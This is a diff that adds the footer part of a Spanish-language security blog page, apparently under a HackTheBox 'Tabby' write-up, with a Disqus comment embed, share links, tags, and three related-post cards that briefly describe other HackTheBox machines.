+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Tabby&url=http://localhost:4000/htb/tabby" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#LFI">LFI</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#LXD">LXD</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#cracking">cracking</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#tomcat">tomcat</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/waldo">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149banner.png" alt="HackTheBox - Waldo"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/waldo">HackTheBox - Waldo</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina linux nivel medio. Los lindos LFI, jugueteo con SSH, llaves privadas traviesas, bypass de shells restringidas yyyyyy cositas con las CAPAcidades BILITIESas.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">09 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/crimestoppers">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120banner.png" alt="HackTheBox - CrimeStoppers"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/crimestoppers">HackTheBox - CrimeStoppers</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel difícil. Explotación web con filtros (wrappers) consiguiendo LFI y RCE, contraseñas de Thunderbird, correos llenos de odio, persistencias locas (un rootkit) y jugueteo entre reversing y criptografía....</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">08 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/breadcrumbs">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316banner.png" alt="HackTheBox - Breadcrumbs"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/breadcrumbs">HackTheBox - Breadcrumbs</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil. Jugaremos mucho con inyecciones y robos :P Encontraremos un LFI, haremos cookie-hijacking, leeremos contraseñas almacenadas, jugando con binarios encontramos una URL que nos llevara de la...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">17 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
